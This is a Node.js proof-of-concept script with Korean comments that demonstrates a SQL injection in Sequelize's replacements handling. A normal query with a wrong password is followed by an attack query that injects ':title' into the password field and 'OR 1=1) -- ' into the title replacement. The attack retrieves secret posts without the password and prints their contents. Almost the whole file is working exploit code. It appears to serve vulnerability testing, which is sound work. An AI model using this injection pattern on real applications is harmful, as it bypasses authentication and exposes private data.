// poc2_secret.js
// 기능2: 비밀글 조회(비밀번호 확인 우회) 테스트만 따로 뺀 파일
// 실행: node poc2_secret.js (별도 서버 실행 불필요)

const { Sequelize, Op } = require('sequelize');
const { sequelize, Post } = require('./models');

async function main() {
  console.log('===== 비밀글 조회 테스트 =====');

  // 정상 동작 확인: 제목은 맞고 비밀번호만 틀리게 조회 시도 (content가 안 나와야 정상)
  let rows = await Post.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`title = :title`),
        { password: '틀린비번' },
      ],
    },
    replacements: { title: '개인 메모' },
  });
  console.log('정상케이스(비번틀림) -> 결과 ' + rows.length + '건 (0건이어야 정상)');

// 로그인 인증 우회와 동일한 원리 title 자리에 OR 1=1, password 자리에 ":title"을 넣으면 비밀번호를 몰라도 비밀글(isSecret: true)까지 전부 조회됨
  rows = await Post.findAll({
    where: {
      [Op.and]: [
        Sequelize.literal(`title = :title`),
        { password: ':title' },
      ],
    },
    replacements: { title: 'OR 1=1) -- ' },
  });
  console.log('공격케이스(비밀글 content 노출) -> 결과 ' + rows.length + '건');
  console.log(rows.map((r) => ({ title: r.title, isSecret: r.isSecret, content: r.content })));

  await sequelize.close();
}

main().catch((err) => {
  console.log('에러남', err);
  process.exit(1);
});
